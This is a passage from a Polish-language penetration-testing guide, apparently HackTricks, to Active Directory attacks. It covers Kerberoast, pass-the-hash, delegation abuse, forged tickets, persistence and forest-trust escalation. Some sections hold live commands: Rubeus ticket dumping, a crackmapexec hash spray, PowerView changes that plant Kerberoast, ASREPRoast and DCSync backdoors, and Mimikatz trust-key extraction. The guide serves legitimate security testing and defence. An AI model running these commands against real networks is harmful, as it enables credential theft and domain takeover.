Następnie oceń odzyskane gMSA jak każde inne poświadczenie: sprawdź członkostwo w lokalnych/grupach domenowych, uprawnienia logowania, SPN-y, delegację i dostępne usługi, zanim spróbujesz pass-the-hash. Ta ścieżka pozyskania oparta na ACL różni się od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), która umożliwia wyprowadzenie zarządzanych haseł po przejęciu klucza głównego KDS.<sup>[[20]](#references)</sup>

Konto komputera może też mieć kontrolę wychodzącą nad innymi obiektami komputerów lub grupami. Po uzyskaniu takiego konta osobno sprawdź jego członkostwo zagnieżdżone i efektywne ACL: prawo zapisu do innego obiektu komputera może umożliwić zmianę konta, a uprawnienia do członkostwa w grupie mogą prowadzić do uzyskania roli logowania. Flaga konta przygotowanego do wdrożenia, przewidywalna konwencja nazewnictwa ani sama krawędź `GenericWrite` nie dowodzą istnienia pełnej ścieżki.

Czytelna kopia bloba `msDS-ManagedPassword` w pliku, udziale lub kopii zapasowej stanowi odrębną ścieżkę ujawnienia: ACL odczytu LDAP nie chroni kopii przechowywanej w innym miejscu. Zanim zinterpretujesz dane, sprawdź, czy to blob zarządzanego hasła, i odróżnij ten przypadek zarówno od autoryzowanego odczytu LDAP, jak i od wyprowadzenia hasła na podstawie klucza głównego KDS.

### Kerberoast

Kerberoasting polega na pozyskiwaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania — opartego na hasłach użytkowników — **offline**.

Więcej informacji:

{{#ref}}
kerberoast.md
{{#endref}}

### Połączenie zdalne (RDP, SSH, FTP, Win-RM itp.)

Po uzyskaniu poświadczeń możesz sprawdzić, czy masz dostęp do jakiejkolwiek **maszyny**. W tym celu możesz użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, zgodnie z wynikami skanowania portów.

### Eskalacja uprawnień lokalnie

Jeśli przejęto poświadczenia lub sesję zwykłego użytkownika domeny i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj sposobu na **lokalną eskalację uprawnień i pozyskanie poświadczeń**. Uprawnienia lokalnego administratora mogą umożliwić **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i lokalnej pamięci masowej (SAM).

W tej książce znajduje się pełna strona o [**lokalnej eskalacji uprawnień w Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Nie zapomnij też użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bieżące bilety sesji

Jest **mało prawdopodobne**, że wśród **biletów** bieżącego użytkownika znajdziesz takie, które **dają uprawnienia dostępu** do nieoczekiwanych zasobów, ale możesz to sprawdzić:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mając poświadczenia domenowe lub sesję użytkownika, wróć do [**ataków relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: techniki enumeracji uwierzytelnionej i wymuszania uwierzytelnienia mogą ujawnić ścieżki relay, które były niedostępne podczas rekonesansu bez uwierzytelnienia.

### Wyszukiwanie poświadczeń w udziałach komputerów | udziałach SMB

Mając już podstawowe poświadczenia, sprawdź, czy możesz **znaleźć** jakieś **interesujące pliki udostępniane w AD**. Możesz zrobić to ręcznie, ale jest to bardzo żmudne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby poznać narzędzia, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (np. plik SCF), których otwarcie **wywoła uwierzytelnianie NTLM wobec Ciebie**, co pozwoli Ci **ukraść** **challenge NTLM** i złamać go:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność umożliwiała każdemu uwierzytelnionemu użytkownikowi **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**Do przeprowadzenia poniższych technik nie wystarczy zwykłe konto użytkownika domeny; potrzebujesz specjalnych uprawnień lub poświadczeń.**

### Ekstrakcja hashy

Miejmy nadzieję, że udało Ci się **przejąć jakieś konto lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym przez relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) lub [lokalną eskalację uprawnień](../windows-local-privilege-escalation/index.html).\
Teraz pora zrzucić wszystkie hashe z pamięci i lokalnych zasobów.\
[**Przeczytaj tę stronę, aby poznać różne sposoby pozyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz już hash użytkownika**, możesz go użyć, aby **podszyć się pod tego użytkownika**.\
Potrzebujesz **narzędzia**, które **przeprowadzi uwierzytelnianie NTLM przy użyciu** tego **hasha**, **albo** możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, dzięki czemu będzie on używany podczas każdego **uwierzytelniania NTLM**. To właśnie robi mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak polega na **użyciu hasha NTLM użytkownika do żądania biletów Kerberos** jako alternatywy dla typowego Pass The Hash z użyciem protokołu NTLM. Może być więc szczególnie **przydatny w sieciach, w których protokół NTLM jest wyłączony** i do uwierzytelniania **dozwolony jest tylko Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika**, a nie jego hasło czy wartości hashy. Następnie używają skradzionego biletu, aby **podszyć się pod użytkownika** i uzyskać nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

Jeśli masz **hash** lub **hasło** **lokalnego administrato**ra, spróbuj **zalogować się lokalnie** na innych **komputerach** przy jego użyciu.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Pamiętaj, że jest to dość **głośne** i **LAPS** może temu **zapobiec**.

### Nadużywanie MSSQL i zaufane łącza

Jeśli użytkownik ma uprawnienia do **uzyskiwania dostępu do instancji MSSQL**, może być w stanie **wykonywać polecenia** na hoście MSSQL (jeśli działa jako SA), **wykraść** **hash** NetNTLM, a nawet przeprowadzić **atak** typu **relay**.\
Jeśli instancja MSSQL jest zaufana przez inną instancję za pośrednictwem łącza do bazy danych, użytkownik mający uprawnienia do połączonej bazy może być w stanie **wykorzystać relację zaufania do wykonywania zapytań na drugiej instancji**. Takie relacje zaufania można łączyć, co może ostatecznie doprowadzić do błędnie skonfigurowanej bazy danych, w której użytkownik może wykonywać polecenia.\
**Łącza między bazami danych działają również w przypadku relacji zaufania między lasami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużywanie platform IT do inwentaryzacji i wdrażania

Pakiety firm trzecich do inwentaryzacji i wdrażania często udostępniają rozbudowane możliwości pozyskiwania danych uwierzytelniających i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić z pamięci TGT wszystkich użytkowników, którzy logują się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na tym komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego przy użyciu [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć serwer wydruku** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma uprawnienia do „Constrained Delegation”, będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do określonych usług na komputerze**.\
Jeśli więc **przejmiesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet administratorów domeny), aby uzyskać dostęp do określonych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie możliwości wykonywania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużywanie uprawnień/ACL

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które mogą umożliwić ci późniejsze **przemieszczanie się** w sieci/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużywanie usługi Printer Spooler

Wykrycie **usługi Spool nasłuchującej** w domenie może zostać **wykorzystane** do **pozyskania nowych danych uwierzytelniających** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużywanie sesji użytkowników trzecich

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętego** komputera, możliwe jest **pozyskanie danych uwierzytelniających z pamięci**, a nawet **wstrzyknięcie beaconów do ich procesów**, aby się pod nich podszyć.\
Użytkownicy zwykle uzyskują dostęp do systemu przez RDP, dlatego poniżej opisano, jak przeprowadzić kilka ataków na sesje RDP użytkowników trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **hasłem lokalnego Administratora** na komputerach dołączonych do domeny, dbając o to, by było **losowe**, unikalne i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą list ACL i ograniczony do uprawnionych użytkowników. Wystarczające uprawnienia do odczytu tych haseł umożliwiają przeskok na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Pozyskanie certyfikatów** z przejętego komputera może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużywanie szablonów certyfikatów

Jeśli skonfigurowano **podatne szablony**, można je wykorzystać do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Zrzucanie danych uwierzytelniających domeny

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **zrzucić** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o kradzieży pliku NTDS.dit znajdziesz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Czytelne archiwum kopii zapasowej zawierające `ntds.dit` wraz z gałęzią rejestru `SYSTEM` należy traktować jako ujawnione dane katalogowe jeszcze przed rozpakowaniem. Nieaktualny hash hasła nie oznacza, że pozostałe atrybuty obiektów są bezpieczne: pola takie jak `description` mogą zawierać dane uwierzytelniające lub notatki operacyjne. Najpierw sprawdź nazwy plików w archiwum i nie umieszczaj rozpakowanej zawartości bazy danych w typowych wynikach enumeracji.

### Privesc jako mechanizm trwałości

Niektóre z omówionych wcześniej technik można wykorzystać do zapewnienia trwałości.\
Na przykład możesz:

- Sprawić, by użytkownicy byli podatni na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Uczyń użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Przyznaj użytkownikowi uprawnienia [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Atak **Silver Ticket** tworzy **legitymny bilet Ticket Granting Service (TGS)** dla określonej usługi, wykorzystując **hash NTLM** (na przykład **hash konta komputera**). Metoda ta służy do **uzyskania uprawnień do usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Atak **Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **hasha NTLM konta krbtgt** w środowisku Active Directory (AD). To konto jest wyjątkowe, ponieważ służy do podpisywania wszystkich **biletów Ticket Granting Ticket (TGT)**, które są niezbędne do uwierzytelniania w sieci AD.

Po zdobyciu tego hasha atakujący może tworzyć **TGT** dla dowolnie wybranego konta (atak Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Przypominają Golden Ticket, ale są fałszowane w sposób **omijający typowe mechanizmy wykrywania Golden Ticket**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Utrzymywanie dostępu do konta za pomocą certyfikatów**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie dostępu do konta użytkownika (nawet jeśli zmieni hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Utrzymywanie dostępu do domeny za pomocą certyfikatów**

**Certyfikaty mogą również posłużyć do utrzymania dostępu z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **grup uprzywilejowanych** (takich jak Domain Admins i Enterprise Admins), stosując do nich standardową **listę kontroli dostępu (ACL)**, która zapobiega nieautoryzowanym zmianom. Można jednak wykorzystać tę funkcję: jeśli atakujący zmodyfikuje ACL AdminSDHolder, aby przyznać zwykłemu użytkownikowi pełny dostęp, użytkownik ten uzyska szeroką kontrolę nad wszystkimi grupami uprzywilejowanymi. Mechanizm bezpieczeństwa, który miał chronić, może więc przynieść odwrotny skutek i umożliwić nieuprawniony dostęp, jeśli nie będzie dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Dane uwierzytelniające DSRM

Na każdym **kontrolerze domeny (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu uprawnień administratora na takim komputerze można wyodrębnić hash lokalnego konta Administrator za pomocą **mimikatz**. Następnie należy zmodyfikować rejestr, aby **umożliwić używanie tego hasła**, co pozwoli na zdalny dostęp do lokalnego konta Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Utrzymywanie dostępu za pomocą ACL

Możesz **przyznać** **użytkownikowi** **specjalne uprawnienia** do określonych obiektów domeny, które pozwolą mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie **obiekt** ma **do** innego **obiektu**. Wystarczy **niewielka zmiana** w **deskryptorze zabezpieczeń** obiektu, aby uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności należenia do uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Wykorzystanie obiektów dynamicznych do zacierania śladów / unikania wykrycia

Wykorzystaj klasę pomocniczą `dynamicObject`, aby tworzyć krótkotrwałe podmioty zabezpieczeń/GPO/rekordy DNS z użyciem `entryTTL`/`msDS-Entry-Time-To-Die`. Są one automatycznie usuwane bez pozostawiania tombstones, co usuwa ślady LDAP, ale pozostawia osierocone identyfikatory SID, nieprawidłowe odwołania `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/DNS zintegrowanego z AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustawić **uniwersalne hasło** zapewniające dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** **dane uwierzytelniające** używane do uzyskania dostępu do komputera w **postaci jawnego tekstu**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy kontroler domeny** w AD i używa go do **modyfikowania atrybutów** (SIDHistory, SPN...) określonych obiektów, **nie pozostawiając** żadnych **logów** dotyczących **modyfikacji**. Wymaga uprawnień **DA** i obecności w **domenie głównej**.\
Pamiętaj, że użycie nieprawidłowych danych spowoduje pojawienie się bardzo niepokojących logów.


{{#ref}}
dcshadow.md
{{#endref}}

### Utrzymywanie dostępu za pomocą LAPS

Wcześniej omówiliśmy eskalację uprawnień, gdy masz **wystarczające uprawnienia do odczytu haseł LAPS**. Haseł tych można jednak również użyć do **utrzymania dostępu**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień w lesie — zaufania domen

Microsoft uznaje **las** za granicę bezpieczeństwa. Oznacza to, że **przejęcie jednej domeny może potencjalnie doprowadzić do przejęcia całego lasu**.<sup>[[1]](#references)</sup>

### Podstawowe informacje

[**Zaufanie domeny**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa, który umożliwia użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy powiązanie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Gdy domeny ustanawiają zaufanie, wymieniają i przechowują określone **klucze** na swoich **kontrolerach domeny (DC)**, które są niezbędne do zachowania integralności zaufania.

W typowym przypadku, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw zażądać od kontrolera domeny swojej domeny specjalnego biletu o nazwie **międzyobszarowy TGT**. Ten TGT jest szyfrowany za pomocą współdzielonego **klucza**, uzgodnionego przez obie domeny. Następnie użytkownik przedstawia ten TGT **kontrolerowi domeny zaufanej domeny**, aby otrzymać bilet usługi (**TGS**). Po pomyślnej weryfikacji międzyobszarowego TGT kontroler domeny zaufanej domeny wystawia TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. **Komputer klienta** w **Domenie 1** rozpoczyna proces, używając swojego **hasza NTLM** do zażądania **biletu Ticket Granting Ticket (TGT)** od swojego **kontrolera domeny (DC1)**.
2. Jeśli uwierzytelnianie klienta powiedzie się, DC1 wystawia nowy TGT.
3. Następnie klient żąda od DC1 **międzyobszarowego TGT**, potrzebnego do uzyskania dostępu do zasobów w **Domenie 2**.
4. Międzyobszarowy TGT jest szyfrowany za pomocą **klucza zaufania**, współdzielonego przez DC1 i DC2 w ramach dwukierunkowego zaufania domen.
5. Klient przekazuje międzyobszarowy TGT **kontrolerowi domeny (DC2) w Domenie 2**.
6. DC2 weryfikuje międzyobszarowy TGT za pomocą współdzielonego klucza zaufania i, jeśli jest prawidłowy, wystawia **Ticket Granting Service (TGS)** dla serwera w Domenie 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi. Bilet jest szyfrowany hashem konta serwera i zapewnia dostęp do usługi w Domenie 2.

### Różne typy zaufania

Należy pamiętać, że **zaufanie może być jednokierunkowe lub dwukierunkowe**. W przypadku zaufania dwukierunkowego obie domeny ufają sobie nawzajem, natomiast w przypadku zaufania **jednokierunkowego** jedna domena jest **zaufana**, a druga jest domeną **ufającą**. W tym drugim przypadku **dostęp do zasobów domeny ufającej będzie możliwy tylko z domeny zaufanej**.

Jeśli Domena A ufa Domenie B, A jest domeną ufającą, a B domeną zaufaną. Ponadto w **Domenie A** będzie to **zaufanie wychodzące**, a w **Domenie B** — **zaufanie przychodzące**.

**Różne relacje zaufania**

- **Zaufania nadrzędna-podrzędna**: To typowa konfiguracja w obrębie tego samego lasu, w której domena podrzędna automatycznie ma dwukierunkowe, przechodnie zaufanie z domeną nadrzędną. Oznacza to, że żądania uwierzytelniania mogą swobodnie przepływać między domeną nadrzędną a podrzędną.
- **Zaufania krzyżowe**: Nazywane „zaufaniami skrótowymi”, są ustanawiane między domenami podrzędnymi, aby przyspieszyć proces przekazywania odwołań. W złożonych lasach odwołania uwierzytelniania zwykle muszą przejść w górę do katalogu głównego lasu, a następnie w dół do domeny docelowej. Utworzenie zaufania krzyżowego skraca tę drogę, co jest szczególnie przydatne w środowiskach rozproszonych geograficznie.
- **Zaufania zewnętrzne**: Są ustanawiane między różnymi, niepowiązanymi domenami i z natury nie są przechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) zaufania zewnętrzne są przydatne do uzyskiwania dostępu do zasobów w domenie spoza bieżącego lasu, która nie jest połączona zaufaniem lasów. Bezpieczeństwo zwiększa filtrowanie SID w przypadku zaufania zewnętrznego.
- **Zaufania katalogu głównego drzewa**: Są automatycznie ustanawiane między domeną główną lasu a nowo dodanym katalogiem głównym drzewa. Choć nie spotyka się ich często, są ważne przy dodawaniu nowych drzew domen do lasu — umożliwiają im zachowanie unikatowej nazwy domeny i zapewniają dwukierunkowe zaufanie przechodnie. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Zaufania lasów**: Ten typ zaufania jest dwukierunkowym, przechodnim zaufaniem między domenami głównymi dwóch lasów. Wykorzystuje również filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **Zaufania MIT**: Są ustanawiane z domenami Kerberos spoza systemu Windows, zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). Zaufania MIT są bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być **dwukierunkowa** (domeny ufają sobie nawzajem) albo **jednokierunkowa** (jedna domena ufa drugiej).

### Ścieżka ataku

1. **Wylicz** relacje zaufania.
2. Sprawdź, czy jakikolwiek **podmiot zabezpieczeń** (użytkownik/grupa/komputer) ma **dostęp** do zasobów **innej domeny** — na przykład przez wpisy ACE lub przynależność do grup w innej domenie. Szukaj **powiązań między domenami** (prawdopodobnie właśnie dlatego ustanowiono zaufanie).
   1. W tym przypadku kerberoast może być kolejną opcją.
3. **Przejmij** **konta**, które umożliwiają **przechodzenie** między domenami.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie za pomocą trzech głównych mechanizmów:

- **Członkostwo w grupach lokalnych**: Podmioty zabezpieczeń mogą być dodane do grup lokalnych na komputerach, takich jak grupa „Administrators” na serwerze, co daje im znaczną kontrolę nad tym komputerem.
- **Członkostwo w grupach obcej domeny**: Podmioty zabezpieczeń mogą być również członkami grup w obcej domenie. Skuteczność tej metody zależy jednak od rodzaju zaufania i zakresu grupy.
- **Listy kontroli dostępu (ACL)**: Podmioty zabezpieczeń mogą być wymienione w **ACL**, zwłaszcza jako podmioty w **ACE** w ramach **DACL**, co zapewnia im dostęp do określonych zasobów. Osobom chcącym lepiej poznać działanie ACL, DACL i ACE przyda się dokument „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Znajdowanie użytkowników/grup zewnętrznych z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć obce podmioty zabezpieczeń w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz sprawdzić to w **Bloodhound** lub za pomocą powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacja uprawnień w lesie z domeny podrzędnej do nadrzędnej

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Inne sposoby enumerowania relacji zaufania domen:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Istnieją **2 klucze zaufania**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Klucz używany przez bieżącą domenę można uzyskać za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin do domeny podrzędnej/nadrzędnej, nadużywając trustu przez SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Zrozumienie, jak można wykorzystać Configuration Naming Context (NC), jest kluczowe. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w lesie Active Directory (AD). Dane te są replikowane do każdego kontrolera domeny (DC) w lesie, a zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej podrzędnym DC.

**Połącz GPO z lokacją głównego DC**

Kontener Sites w Configuration NC zawiera informacje o lokacjach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą łączyć GPO z lokacjami głównych DC. Działanie to może doprowadzić do przejęcia domeny głównej poprzez manipulowanie zasadami stosowanymi do tych lokacji.

Szczegółowe informacje można znaleźć w badaniach dotyczących [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Przejmij dowolne gMSA w lesie**

Jednym z wektorów ataku jest atakowanie uprzywilejowanych gMSA w domenie. Klucz główny KDS, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do klucza głównego KDS i obliczyć hasła dowolnych gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowane MSA (BadSuccessor – nadużywanie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe badania zewnętrzne: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Atak polegający na zmianie schematu**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować schemat AD, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to doprowadzić do nieautoryzowanego dostępu do nowo utworzonych obiektów AD i przejęcia nad nimi kontroli.

Więcej informacji można znaleźć w [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA z ADCS ESC5**

Podatność ADCS ESC5 polega na przejęciu kontroli nad obiektami Public Key Infrastructure (PKI) w celu utworzenia szablonu certyfikatu umożliwiającego uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego podrzędnego DC umożliwia przeprowadzenie ataków ESC5.

Więcej informacji można znaleźć w [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Jeśli w środowisku nie ma ADCS, atakujący może skonfigurować niezbędne komponenty, jak opisano w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Zewnętrzna domena lasu — jednokierunkowa (przychodząca) lub dwukierunkowa

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** w tej domenie. Musisz ustalić, **które podmioty zabezpieczeń z Twojej domeny mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować to wykorzystać:


{{#ref}}
